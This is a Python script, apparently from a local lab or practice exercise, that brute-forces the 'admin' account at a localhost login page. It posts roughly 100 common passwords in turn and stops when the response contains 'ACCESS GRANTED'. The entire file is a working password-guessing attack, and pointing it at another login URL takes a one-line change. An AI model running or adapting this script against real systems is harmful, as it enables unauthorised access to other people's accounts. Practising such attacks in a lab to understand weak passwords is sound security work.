import requests


url = "http://localhost:8080/login"
username = "admin"

passwords = ["123456" ,  "password" ,  "12345678" ,  "qwerty" ,  "123456789" ,  "12345" ,  "1234" ,  "111111" ,  "1234567" ,  "dragon" ,  "123123" ,  "baseball" ,  "abc123" ,  "football" ,  "monkey" ,  "letmein" ,  "696969" ,  "shadow" ,  "master" ,  "666666" ,  "qwertyuiop" ,  "123321" ,  "mustang" ,  "1234567890" ,  "michael" ,  "654321" ,  "pussy" ,  "superman" ,  "1qaz2wsx" ,  "7777777" ,  "fuckyou" ,  "121212" ,  "000000" ,  "qazwsx" ,  "123qwe" ,  "killer" ,  "trustno1" ,  "jordan" ,  "jennifer" ,  "zxcvbnm" ,  "asdfgh" ,  "hunter" ,  "buster" ,  "soccer" ,  "harley" ,  "batman" ,  "andrew" ,  "tigger" ,  "sunshine" ,  "iloveyou" ,  "fuckme" ,  "2000" ,  "charlie" ,  "robert" ,  "thomas" ,  "hockey" ,  "ranger" ,  "daniel" ,  "starwars" ,  "klaster" ,  "112233" ,  "george" ,  "asshole" ,  "computer" ,  "michelle" ,  "jessica" ,  "pepper" ,  "1111" ,  "zxcvbn" ,  "555555" ,  "11111111" ,  "131313" ,  "freedom" ,  "777777" ,  "pass" ,  "fuck" ,  "maggie" ,  "159753" ,  "aaaaaa" ,  "ginger" ,  "princess" ,  "joshua" ,  "cheese" ,  "amanda" ,  "summer" ,  "love" ,  "ashley" ,  "6969" ,  "nicole" ,  "chelsea" ,  "biteme" ,  "matthew" ,  "access" ,  "yankees" ,  "987654321" ,  "dallas" ,  "austin" ,  "thunder" ,  "taylor" ,  "matrix" ,  "minecraft"]



def try_login(password):
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)
 
    
    # At first i printed all the responses and found that the response text would either say "ACCESS GRANTED" or "ACCESS DENIED" 
    # If the response string contained "ACCESS GRANTED" try_login returns true and the password which produced that response is printed.
    if "ACCESS GRANTED" in response.text:  # Check for the success message
        print(f"[+] Successful login with password: '{password}'")
        return True
    else:
        return False

def main():
    for i in passwords:
        
        print(f"[*] Trying password: '{i}'")
        
        if try_login(i):
            break
    else:
        print("[-] No valid password found in the list.")



if __name__ == "__main__":
    main()